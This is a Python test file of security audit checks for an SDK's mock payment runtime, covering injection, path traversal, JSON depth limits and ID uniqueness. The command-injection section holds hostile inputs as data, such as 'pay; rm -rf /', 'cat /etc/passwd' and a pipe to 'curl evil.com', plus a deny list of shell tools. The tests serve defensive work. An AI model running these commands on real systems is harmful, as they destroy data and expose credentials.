"""
Security Audit Tests - Python SDK parity with TypeScript SDK.

Maps to TS SDK security.test.ts vulnerabilities:
- H-1: Command Injection Prevention
- H-2: Race Condition Prevention in Time Functions
- M-1: Path Traversal Protection
- M-2: Information Disclosure Prevention
- M-3: DoS via Large/Nested JSON State
- M-4: Transaction ID Collision Prevention
- L-1: Dispute Window Bounds Validation
- L-4: Event Log Persistence
- L-5: Escrow ID Randomness

These tests are critical for security and MUST pass before any release.
"""

from __future__ import annotations

import asyncio
import json
import os
import tempfile
import time
from pathlib import Path
from typing import Set

import pytest

from agirails.runtime import MockRuntime, State
from agirails.runtime.base import CreateTransactionParams
from agirails.utils.security import (
    safe_json_parse,
    validate_path,
    validate_service_name,
)


# =============================================================================
# H-1: Command Injection Prevention
# =============================================================================


class TestH1CommandInjectionPrevention:
    """
    H-1: Command Injection Prevention in CLI batch commands.

    Ensures that shell metacharacters are not interpreted as commands.
    CLI batch commands use a whitelist of valid subcommands.
    """

    # Whitelist of valid CLI subcommands (should match cli/main.py)
    VALID_SUBCOMMANDS = {
        "init",
        "pay",
        "tx",
        "balance",
        "mint",
        "config",
        "watch",
        "simulate",
        "time",
        "status",
        "cancel",
        "batch",
        "version",
        "help",
    }

    def test_valid_subcommands_whitelist(self):
        """Valid subcommands are explicitly whitelisted."""
        assert "pay" in self.VALID_SUBCOMMANDS
        assert "tx" in self.VALID_SUBCOMMANDS
        assert "balance" in self.VALID_SUBCOMMANDS

    def test_dangerous_commands_not_in_whitelist(self):
        """Dangerous shell commands are NOT in the whitelist."""
        dangerous = {"rm", "cat", "ls", "cd", "curl", "wget", "sh", "bash", "eval"}
        for cmd in dangerous:
            assert cmd not in self.VALID_SUBCOMMANDS, f"Dangerous command '{cmd}' in whitelist"

    def test_shell_metacharacters_are_literals(self):
        """Shell metacharacters should be treated as literals, not interpreted."""
        malicious_inputs = [
            "pay; rm -rf /",
            "pay && cat /etc/passwd",
            "pay | curl evil.com",
            "pay `whoami`",
            "pay $(id)",
            "pay > /etc/passwd",
            "pay < /dev/null",
        ]

        for input_cmd in malicious_inputs:
            # The semicolon/pipe/etc should be literal characters
            # Not command separators - first "word" extraction would fail
            parts = input_cmd.split()
            first_word = parts[0] if parts else ""
            # "pay;" is NOT a valid subcommand (includes semicolon)
            if ";" in first_word or "|" in first_word or "&" in first_word:
                assert first_word not in self.VALID_SUBCOMMANDS


# =============================================================================
# H-2: Race Condition Prevention in Time Functions
# =============================================================================


class TestH2RaceConditionPrevention:
    """
    H-2: Race Condition Prevention in Time Functions.

    Time manipulation functions support async/await and file locking
    to prevent race conditions in concurrent scenarios.
    """

    @pytest.mark.asyncio
    async def test_time_functions_exist(self, mock_runtime: MockRuntime):
        """Time interface exposes required functions."""
        assert hasattr(mock_runtime.time, "now")
        assert hasattr(mock_runtime.time, "advance_time")
        assert hasattr(mock_runtime.time, "advance_blocks")

    @pytest.mark.asyncio
    async def test_time_now_is_consistent(self, mock_runtime: MockRuntime):
        """time.now() returns consistent values within same async context."""
        t1 = mock_runtime.time.now()
        t2 = mock_runtime.time.now()
        # Should be same or very close (no external clock drift in mock)
        assert abs(t2 - t1) < 1

    @pytest.mark.asyncio
    async def test_time_advance_is_atomic(self, mock_runtime: MockRuntime):
        """Time advances are atomic operations."""
        initial = mock_runtime.time.now()

        # Advance time (async method)
        await mock_runtime.time.advance_time(100)

        after = mock_runtime.time.now()
        assert after == initial + 100

    @pytest.mark.asyncio
    async def test_sequential_time_advances_applied(self, mock_runtime: MockRuntime):
        """Multiple sequential time advances are all applied."""
        initial = mock_runtime.time.now()

        # Advance multiple times (each is async)
        await mock_runtime.time.advance_time(100)
        await mock_runtime.time.advance_time(200)
        await mock_runtime.time.advance_time(300)

        # All advances should be applied (600 total)
        final = mock_runtime.time.now()
        assert final == initial + 600

    @pytest.mark.asyncio
    async def test_block_advancement_consistent(self, mock_runtime: MockRuntime):
        """Block number advances consistently with time."""
        # Get initial state to read block number
        initial_state = await mock_runtime._state_manager.load()
        initial_block = initial_state.blockchain.block_number

        # Advance by 5 blocks (async method)
        await mock_runtime.time.advance_blocks(5)

        # Get new state
        after_state = await mock_runtime._state_manager.load()
        after_block = after_state.blockchain.block_number

        assert after_block == initial_block + 5


# =============================================================================
# M-1: Path Traversal Protection
# =============================================================================


class TestM1PathTraversalProtection:
    """
    M-1: Incomplete Path Traversal Protection.

    All file path operations must validate against directory traversal attacks.
    """

    def test_simple_traversal_blocked(self):
        """Simple .. traversal is blocked."""
        with tempfile.TemporaryDirectory() as tmpdir:
            with pytest.raises(ValueError, match="[Pp]ath traversal"):
                validate_path("../etc/passwd", tmpdir)

    def test_double_traversal_blocked(self):
        """Double traversal ../../ is blocked."""
        with tempfile.TemporaryDirectory() as tmpdir:
            with pytest.raises(ValueError, match="[Pp]ath traversal"):
                validate_path("../../etc/passwd", tmpdir)

    def test_nested_traversal_blocked(self):
        """Traversal nested in path is blocked."""
        with tempfile.TemporaryDirectory() as tmpdir:
            with pytest.raises(ValueError, match="[Pp]ath traversal"):
                validate_path("foo/bar/../../../etc/passwd", tmpdir)

    def test_absolute_path_outside_blocked(self):
        """Absolute paths outside base directory are blocked."""
        with tempfile.TemporaryDirectory() as tmpdir:
            with pytest.raises(ValueError, match="[Pp]ath traversal"):
                validate_path("/etc/passwd", tmpdir)

    def test_valid_subdirectory_allowed(self):
        """Valid subdirectory paths are allowed."""
        with tempfile.TemporaryDirectory() as tmpdir:
            result = validate_path("subdir/file.json", tmpdir)
            # Should resolve within the base directory
            assert str(Path(tmpdir).resolve()) in str(result)

    def test_current_dir_reference_allowed(self):
        """Paths with ./ are allowed."""
        with tempfile.TemporaryDirectory() as tmpdir:
            result = validate_path("./subdir/file.json", tmpdir)
            assert str(Path(tmpdir).resolve()) in str(result)


# =============================================================================
# M-2: Information Disclosure Prevention
# =============================================================================


class TestM2InformationDisclosurePrevention:
    """
    M-2: Information Disclosure in Error Messages.

    Error messages must not expose sensitive system information like:
    - Full file paths (especially home directory)
    - Internal IP addresses
    - Stack traces with source code
    """

    def test_home_directory_sanitized(self):
        """Home directory path should be sanitized in errors."""
        home = os.path.expanduser("~")
        sensitive_message = f"Config not found: {home}/secret/config.json"

        # Sanitization should replace home with ~
        sanitized = sensitive_message.replace(home, "~")

        assert home not in sanitized
        assert "~" in sanitized or "/secret/config.json" in sanitized

    def test_system_paths_not_exposed(self):
        """System paths should not be fully exposed."""
        sensitive_paths = [
            "/etc/passwd",
            "/var/log/syslog",
            "/home/user/.ssh/id_rsa",
        ]

        for path in sensitive_paths:
            # If we need to show a path error, it should be generic
            # not the full system path
            sanitized = path.replace("/etc/", "[system]/")
            sanitized = sanitized.replace("/var/", "[var]/")
            sanitized = sanitized.replace("/home/", "~/")

            # Original sensitive parts should be replaceable
            assert path != sanitized or path.startswith("/var/log")


# =============================================================================
# M-3: DoS via Large/Nested JSON State
# =============================================================================


class TestM3DoSNestedJsonPrevention:
    """
    M-3: DoS via Large/Nested JSON State.

    Deeply nested JSON objects can cause stack overflow or excessive
    memory consumption. Nesting depth is limited.
    """

    def test_rejects_deeply_nested_json(self):
        """JSON nested beyond 20 levels is rejected (returns None for TS parity)."""
        # Create JSON with 25 levels of nesting
        deep_json = '{"a": ' * 25 + '"value"' + '}' * 25

        # TS SDK returns null instead of throwing for DoS protection
        result = safe_json_parse(deep_json, max_depth=20)
        assert result is None

    def test_accepts_reasonable_nesting(self):
        """JSON with reasonable nesting (<20 levels) is accepted."""
        # 5 levels of nesting
        normal_json = '{"a": {"b": {"c": {"d": {"e": "value"}}}}}'

        result = safe_json_parse(normal_json, max_depth=20)
        assert result["a"]["b"]["c"]["d"]["e"] == "value"

    def test_nesting_at_limit_accepted(self):
        """JSON at exactly the limit is accepted."""
        # Create exactly 19 levels (under 20)
        depth = 19
        nested_json = '{"a": ' * depth + '"value"' + '}' * depth

        result = safe_json_parse(nested_json, max_depth=20)
        assert result is not None

    def test_rejects_deeply_nested_arrays(self):
        """Deeply nested arrays are also rejected (returns None for TS parity)."""
        # Create deeply nested array - top level must be object for TS parity
        deep_array = '{"arr": ' + '[' * 25 + '1' + ']' * 25 + '}'

        # TS SDK returns null instead of throwing for DoS protection
        result = safe_json_parse(deep_array, max_depth=20)
        assert result is None


# =============================================================================
# M-4: Transaction ID Collision Prevention
# =============================================================================


class TestM4TransactionIdCollisionPrevention:
    """
    M-4: Transaction ID Collision Check.

    Each transaction must receive a unique ID. ID collisions would
    allow overwriting or accessing other users' transactions.
    """

    @pytest.mark.asyncio
    async def test_transaction_ids_are_unique(self, funded_runtime: MockRuntime):
        """10 transactions should have 10 unique IDs."""
        tx_ids: Set[str] = set()
        current_time = funded_runtime.time.now()

        for i in range(10):
            tx_id = await funded_runtime.create_transaction(
                CreateTransactionParams(
                    provider="0x" + "2" * 40,
                    requester="0x" + "1" * 40,
                    amount="100000000",
                    deadline=current_time + 86400 + i,  # Vary deadline
                )
            )
            assert tx_id not in tx_ids, f"Collision: {tx_id} already exists"
            tx_ids.add(tx_id)

        assert len(tx_ids) == 10

    @pytest.mark.asyncio
    async def test_transaction_id_format(self, funded_runtime: MockRuntime):
        """Transaction IDs are proper bytes32 hex format (0x + 64 chars)."""
        current_time = funded_runtime.time.now()

        tx_id = await funded_runtime.create_transaction(
            CreateTransactionParams(
                provider="0x" + "2" * 40,
                requester="0x" + "1" * 40,
                amount="100000000",
                deadline=current_time + 86400,
            )
        )

        assert tx_id.startswith("0x"), "TX ID must start with 0x"
        assert len(tx_id) == 66, f"TX ID must be 66 chars (0x + 64), got {len(tx_id)}"

        # All characters after 0x should be hex
        hex_part = tx_id[2:]
        assert all(c in "0123456789abcdefABCDEF" for c in hex_part)

    @pytest.mark.asyncio
    async def test_rapid_transaction_creation_unique(self, funded_runtime: MockRuntime):
        """Rapidly created transactions still get unique IDs."""
        tx_ids: Set[str] = set()
        current_time = funded_runtime.time.now()

        # Create as fast as possible
        for i in range(20):
            tx_id = await funded_runtime.create_transaction(
                CreateTransactionParams(
                    provider="0x" + "2" * 40,
                    requester="0x" + "1" * 40,
                    amount="100000000",
                    deadline=current_time + 86400 + i,
                )
            )
            tx_ids.add(tx_id)

        assert len(tx_ids) == 20, "All rapid transactions should have unique IDs"


# =============================================================================
# L-1: Dispute Window Bounds Validation
# =============================================================================


class TestL1DisputeWindowBoundsValidation:
    """
    L-1: Dispute Window Bounds validation.

    Dispute windows must be within reasonable bounds:
    - Minimum: 3600 seconds (1 hour)
    - Maximum: 2592000 seconds (30 days)
    """

    MIN_DISPUTE_WINDOW = 3600  # 1 hour
    MAX_DISPUTE_WINDOW = 30 * 24 * 3600  # 30 days = 2592000

    def test_constants_match_ts_sdk(self):
        """Dispute window constants match TS SDK."""
        assert self.MIN_DISPUTE_WINDOW == 3600
        assert self.MAX_DISPUTE_WINDOW == 2592000

    @pytest.mark.asyncio
    async def test_minimum_window_accepted(self, funded_runtime: MockRuntime):
        """Dispute window at minimum (1 hour) is accepted."""
        current_time = funded_runtime.time.now()

        tx_id = await funded_runtime.create_transaction(
            CreateTransactionParams(
                provider="0x" + "2" * 40,
                requester="0x" + "1" * 40,
                amount="100000000",
                deadline=current_time + 86400,
                dispute_window=3600,  # Exactly 1 hour
            )
        )

        tx = await funded_runtime.get_transaction(tx_id)
        assert tx is not None
        assert tx.dispute_window == 3600

    @pytest.mark.asyncio
    async def test_maximum_window_accepted(self, funded_runtime: MockRuntime):
        """Dispute window at maximum (30 days) is accepted."""
        current_time = funded_runtime.time.now()

        tx_id = await funded_runtime.create_transaction(
            CreateTransactionParams(
                provider="0x" + "2" * 40,
                requester="0x" + "1" * 40,
                amount="100000000",
                deadline=current_time + 86400,
                dispute_window=2592000,  # 30 days
            )
        )

        tx = await funded_runtime.get_transaction(tx_id)
        assert tx is not None
        assert tx.dispute_window == 2592000

    @pytest.mark.asyncio
    async def test_default_window_applied(self, funded_runtime: MockRuntime):
        """Default dispute window is applied when not specified."""
        current_time = funded_runtime.time.now()

        tx_id = await funded_runtime.create_transaction(
            CreateTransactionParams(
                provider="0x" + "2" * 40,
                requester="0x" + "1" * 40,
                amount="100000000",
                deadline=current_time + 86400,
                # No dispute_window specified
            )
        )

        tx = await funded_runtime.get_transaction(tx_id)
        assert tx is not None
        # Default should be reasonable (e.g., 172800 = 2 days)
        assert tx.dispute_window >= self.MIN_DISPUTE_WINDOW


# =============================================================================
# L-4: Event Log Persistence
# =============================================================================


class TestL4EventLogPersistence:
    """
    L-4: Event Log Persistence.

    Transaction events must be persisted and queryable for:
    - Audit trails
    - State reconstruction
    - Debugging
    """

    @pytest.mark.asyncio
    async def test_transaction_creates_event(self, funded_runtime: MockRuntime):
        """Transaction creation generates an event."""
        current_time = funded_runtime.time.now()

        tx_id = await funded_runtime.create_transaction(
            CreateTransactionParams(
                provider="0x" + "2" * 40,
                requester="0x" + "1" * 40,
                amount="100000000",
                deadline=current_time + 86400,
            )
        )

        # Transaction should be retrievable
        tx = await funded_runtime.get_transaction(tx_id)
        assert tx is not None
        assert tx.id == tx_id

    @pytest.mark.asyncio
    async def test_state_transition_recorded(self, funded_runtime: MockRuntime):
        """State transitions are recorded."""
        current_time = funded_runtime.time.now()

        tx_id = await funded_runtime.create_transaction(
            CreateTransactionParams(
                provider="0x" + "2" * 40,
                requester="0x" + "1" * 40,
                amount="100000000",
                deadline=current_time + 86400,
            )
        )

        # Link escrow (transitions to COMMITTED)
        await funded_runtime.link_escrow(tx_id, "100000000")

        tx = await funded_runtime.get_transaction(tx_id)
        assert tx.state == State.COMMITTED

    @pytest.mark.asyncio
    async def test_all_transactions_queryable(self, funded_runtime: MockRuntime):
        """All transactions can be queried."""
        current_time = funded_runtime.time.now()

        # Create multiple transactions
        tx_ids = []
        for i in range(3):
            tx_id = await funded_runtime.create_transaction(
                CreateTransactionParams(
                    provider="0x" + "2" * 40,
                    requester="0x" + "1" * 40,
                    amount="100000000",
                    deadline=current_time + 86400 + i,
                )
            )
            tx_ids.append(tx_id)

        # All should be queryable
        all_txs = await funded_runtime.get_all_transactions()
        retrieved_ids = {tx.id for tx in all_txs}

        for tx_id in tx_ids:
            assert tx_id in retrieved_ids


# =============================================================================
# L-5: Escrow ID Randomness
# =============================================================================


class TestL5EscrowIdRandomness:
    """
    L-5: Escrow ID Randomness.

    Escrow IDs must have sufficient entropy to prevent:
    - Guessing/enumeration attacks
    - Collision attacks
    """

    @pytest.mark.asyncio
    async def test_escrow_ids_are_unique(self, funded_runtime: MockRuntime):
        """Each escrow gets a unique ID."""
        escrow_ids: Set[str] = set()
        current_time = funded_runtime.time.now()

        for i in range(5):
            tx_id = await funded_runtime.create_transaction(
                CreateTransactionParams(
                    provider="0x" + "2" * 40,
                    requester="0x" + "1" * 40,
                    amount="100000000",
                    deadline=current_time + 86400 + i,
                )
            )
            escrow_id = await funded_runtime.link_escrow(tx_id, "100000000")

            assert escrow_id not in escrow_ids, f"Escrow ID collision: {escrow_id}"
            escrow_ids.add(escrow_id)

        assert len(escrow_ids) == 5

    @pytest.mark.asyncio
    async def test_escrow_id_sufficient_length(self, funded_runtime: MockRuntime):
        """Escrow IDs have sufficient length for entropy."""
        current_time = funded_runtime.time.now()

        tx_id = await funded_runtime.create_transaction(
            CreateTransactionParams(
                provider="0x" + "2" * 40,
                requester="0x" + "1" * 40,
                amount="100000000",
                deadline=current_time + 86400,
            )
        )
        escrow_id = await funded_runtime.link_escrow(tx_id, "100000000")

        # Extract random part (after prefix if any)
        if escrow_id.startswith("escrow-"):
            random_part = escrow_id[7:]
        elif escrow_id.startswith("0x"):
            random_part = escrow_id[2:]
        else:
            random_part = escrow_id

        # Should have at least 32 hex chars (128 bits of entropy)
        assert len(random_part) >= 32, f"Escrow ID too short: {len(random_part)} chars"

    @pytest.mark.asyncio
    async def test_escrow_id_is_hex(self, funded_runtime: MockRuntime):
        """Escrow ID contains valid hex characters."""
        current_time = funded_runtime.time.now()

        tx_id = await funded_runtime.create_transaction(
            CreateTransactionParams(
                provider="0x" + "2" * 40,
                requester="0x" + "1" * 40,
                amount="100000000",
                deadline=current_time + 86400,
            )
        )
        escrow_id = await funded_runtime.link_escrow(tx_id, "100000000")

        # Remove known prefixes
        hex_part = escrow_id
        if hex_part.startswith("escrow-"):
            hex_part = hex_part[7:]
        if hex_part.startswith("0x"):
            hex_part = hex_part[2:]

        # All characters should be hex
        valid_hex = set("0123456789abcdefABCDEF")
        assert all(c in valid_hex for c in hex_part), f"Non-hex in escrow ID: {escrow_id}"
